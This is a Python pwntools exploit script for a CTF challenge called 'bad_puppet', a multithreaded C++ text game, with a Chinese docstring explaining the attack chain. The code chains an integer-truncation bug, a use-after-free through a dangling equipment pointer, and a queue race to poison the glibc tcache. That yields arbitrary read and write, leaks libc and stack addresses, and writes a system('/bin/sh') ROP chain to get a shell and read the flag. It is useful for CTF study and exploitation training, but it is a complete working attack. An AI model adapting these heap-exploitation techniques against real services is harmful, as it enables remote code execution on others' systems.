#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
bad_puppet exploit (2026 强网杯) —— 塞尔达主题的多线程 C++ 文本网游。

漏洞（题解第 2 节）：
  * `inv drop <idx>` 只清理背包数组，不会把同一指针从装备表 g_equipment 摘除
    -> 装备槽悬空指针。`mw show` / `mw whisper` 都按下标取指针，于是分别变成
       "读已释放 chunk" 与 "写已释放 chunk"（whisper 只接受 RingItem，即魔戒）。
  * 交易线程异步处理 equip/unequip：克隆用"当前占用者"，释放用"入队时的旧指针"，
    队列积压时会多释放一个块，把 tcache 计数从 1 抬到 2。

链条（题解第 3 节）：
  经济漏洞 shop buy 3 0x100000001（单价按 32 位截断，发货按 64 位）白嫖炸弹
  -> 秒 Boss 拿魔戒并装备 -> mw show 泄漏 A（魔戒 chunk）
  -> inv drop 2 造成悬空，再次 mw show 读到 tcache 头（safe-linking next + key）
  -> 队列积压把 tcache 计数做到 2 -> whisper 投毒 next 为 T（safe-linking）
  -> shop buy 0 2 让第二次 malloc 落在 T，得到"任意地址分配 + 127 字节写"
  -> T = P+0xcf0 覆盖 g_puppet 指针表，inv list 把 *(uint64*)X 当条目编号打印 = 任意读
  -> 读 P+0x8a0 得 main_arena -> libc；读 environ -> 栈
  -> 在 environ-0x280 分配并写 pop rdi; "/bin/sh"; system，quit 触发 command_loop 返回

用法：
    python exp.py TARGET_HOST PORT
"""
import argparse
import re
import struct
import sys
import time

from pwn import context, log, remote

context.log_level = 'info'

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)

# ---------------------------------------------------------------- 常量（题解常量表）
OFF_MAIN_ARENA = 0x204ac0
OFF_ENVIRON = 0x20bd58
OFF_SYSTEM = 0x58750
OFF_BIN_SH = 0x1cc42f
OFF_POP_RDI = 0x10c08d
OFF_COMMAND_LOOP_RET = 0x5118
RET_SLOT_FROM_ENVIRON = -0x278

CHUNK = 0x170
G_PUPPET_OFF = 0xcf0
MALLOC_STATE_OFF = 0x8a0
FAKE_SIZE = 0x101            # PREV_INUSE=1, IS_MMAPPED=0, NON_MAIN_ARENA=0

DEFAULT_HOST = "TARGET_HOST"
DEFAULT_PORT = 9999


class Game:
    def __init__(self, host, port, timeout=10.0):
        self.io = remote(host, port, timeout=timeout)
        self.buf = b""
        self.read(1.5)

    # --- 收发 -------------------------------------------------------------
    def read(self, wait=0.8, quiet=0.3):
        end = time.time() + wait
        last = time.time()
        out = b""
        while time.time() < end:
            try:
                chunk = self.io.recv(timeout=0.15)
            except EOFError:
                break
            if not chunk:
                if out and time.time() - last > quiet:
                    break
                continue
            out += chunk
            last = time.time()
        self.buf += out
        return out.decode("latin-1", "replace")

    def cmd(self, line, wait=0.8, quiet=0.3):
        self.io.send((line + "\n").encode())
        return self.read(wait, quiet)

    def close(self):
        try:
            self.io.close()
        except Exception:
            pass

    # --- 解析 -------------------------------------------------------------
    @staticmethod
    def _hexes(text):
        return [int(x, 16) for x in re.findall(r"0x[0-9a-fA-F]+", text)]

    def show_slots(self):
        """mw show：返回 [(role, addr, head, key), ...]"""
        out = self.cmd("mw show", 1.0)
        rows = []
        for line in out.splitlines():
            if "description_addr" not in line:
                continue
            vals = self._hexes(line)
            if len(vals) >= 2:
                role = line.split("role=")[1].split()[0] if "role=" in line else "?"
                rows.append((role, vals[0], vals[1] if len(vals) > 1 else 0,
                             vals[2] if len(vals) > 2 else 0))
        return rows

    # --- 原语 -------------------------------------------------------------
    def backlog(self, n=400):
        """灌满交易队列：让"克隆当前占用者、释放旧指针"错位，tcache 计数 +1。"""
        for i in range(n):
            self.io.send(b"inv equip 0\n")
            self.io.send(b"inv unequip 0\n")
            if i % 50 == 49:
                time.sleep(0.05)
        time.sleep(0.5)
        self.read(1.0)

    def poison(self, target, data=b""):
        """
        whisper 把 A 的 next 改成 safe-linking 后的 target，并在 data 里放要落地的内容。
        payload[0:8] 同时是 tcache next 和落到 target 的第一个 qword。
        """
        pl = p64((self.A >> 12) ^ target) + data
        if len(pl) < 0x80:
            pl = pl.ljust(0x80, b"\xAA")
        # 目标为 A+0x80 时，顺手在 T-8 放一个合法的伪 chunk size（题解「tcache投毒与任意地址分配」一节）
        if target == self.A + 0x80:
            pl = pl[:0x78] + p64(FAKE_SIZE) + pl[0x80:]
        assert len(pl) <= 127
        self.cmd("mw whisper 0 " + pl.hex(), 0.6)
        self.cmd("mw whisper 1 " + pl.hex(), 0.6)

    def alloc_at(self, target):
        """让第二次 malloc(0x170) 正好返回 target（第一次弹 A）。"""
        self.cmd("shop buy 0 2", 1.0)
        self.cmd("inv sort", 0.6)

    def read64(self, addr, retries=3):
        """T = P+0xcf0 覆盖 g_puppet 表，表项全部指向 addr，inv list 打印 *(uint64*)addr。"""
        for _ in range(retries):
            self.poison(self.P + G_PUPPET_OFF, p64(addr) * 15)
            self.alloc_at(self.P + G_PUPPET_OFF)
            out = self.cmd("inv list", 1.0)
            nums = [int(x) for x in re.findall(r"#(\d+)", out)]
            if len(nums) >= 2:
                return nums[1] & 0xffffffffffffffff
            if nums:
                return nums[0] & 0xffffffffffffffff
            # 没落在表上：重新做一次计数与投毒
            self.read(0.5)
        raise RuntimeError("read64(%#x) failed" % addr)


def exploit(host, port):
    g = Game(host, port)

    # --- 1. 经济漏洞 + 秒 Boss 拿戒指 -------------------------------------
    g.cmd("shop buy 3 0x100000001", 1.0)     # 64 卢比换 4294967297 个炸弹
    g.cmd("map teleport castle", 0.8)
    g.cmd("battle", 0.8)
    g.cmd("use item 1 32", 0.8)
    g.cmd("mw pickup 0", 0.8)
    g.cmd("inv equip 2", 0.8)

    rows = g.show_slots()
    ring = [r for r in rows if "Ring" in r[0]] or rows
    if not ring:
        raise RuntimeError("ring not found in mw show")
    A = ring[-1][1]
    g.A = A
    log.success("ring chunk A = %#x" % A)

    # --- 2. 悬空 + 泄漏 tcache 头 -----------------------------------------
    g.cmd("inv drop 2", 0.8)
    rows = g.show_slots()
    head, key = rows[-1][2], rows[-1][3]
    log.info("tcache head=%#x key=%#x" % (head, key))
    # bin 里只有 A 时 next = (A>>12) ^ 0，所以 head 本身就是堆页号（>>12）
    P = A & ~0xFFFFFF
    if head and (head << 12) & ~0xFFFFFF != P:
        log.warning("heap page from tcache head mismatch, using A & ~0xffffff")
    g.P = P
    log.success("heap base P = %#x" % P)

    # --- 3. 把 tcache 计数做到 2 ------------------------------------------
    g.backlog(400)
    g.cmd("inv drop 0", 0.8)
    g.cmd("inv drop 1", 0.8)
    g.cmd("shop buy 0 2", 1.0)      # 能连弹两个块即说明计数为 2
    g.cmd("inv sort", 0.6)

    # --- 4. 任意读：main_arena -> libc -> environ -------------------------
    arena_next = g.read64(P + MALLOC_STATE_OFF)
    libc = arena_next - OFF_MAIN_ARENA
    if libc & 0xfff:
        raise RuntimeError("bad libc base %#x" % libc)
    if (g.read64(libc) & 0xffffffff) != 0x464c457f:      # \x7fELF
        raise RuntimeError("libc ELF header check failed")
    log.success("libc = %#x" % libc)

    environ = g.read64(libc + OFF_ENVIRON)
    if (environ >> 40) != 0x7f:
        log.warning("environ = %#x, stack range looks unusual" % environ)
    log.success("environ = %#x" % environ)

    # --- 5. 栈上写 ROP，quit 触发 command_loop 返回 ------------------------
    # 第一个 qword 必须是 safe-linking 后的 next，所以分配点取 environ-0x280，
    # 让 pop rdi 正好落在 environ-0x278（= command_loop 的返回地址槽）。
    target = environ - 0x280
    chain = p64(libc + OFF_POP_RDI) + p64(libc + OFF_BIN_SH) + p64(libc + OFF_SYSTEM)
    g.poison(target, chain)
    g.alloc_at(target)
    log.info("ROP written at %#x (ret slot %#x)" % (target, environ + RET_SLOT_FROM_ENVIRON))

    g.io.send(b"quit\n")
    time.sleep(0.5)
    g.io.send(b"cat /flag; echo __END__\n")

    out = b""
    try:
        while True:
            chunk = g.io.recv(timeout=5)
            if not chunk:
                break
            out += chunk
            if b"__END__" in out:
                break
    except EOFError:
        pass
    g.close()
    return out


def main():
    ap = argparse.ArgumentParser(description="bad_puppet exploit")
    ap.add_argument("host", nargs="?", default=DEFAULT_HOST)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    args = ap.parse_args()

    out = exploit(args.host, args.port)
    text = out.decode("latin-1", "replace")
    idx = text.find("flag{")
    if idx >= 0:
        end = text.find("}", idx)
        print("[+] FLAG:", text[idx:end + 1])
    else:
        print(text[-3000:])


if __name__ == "__main__":
    main()
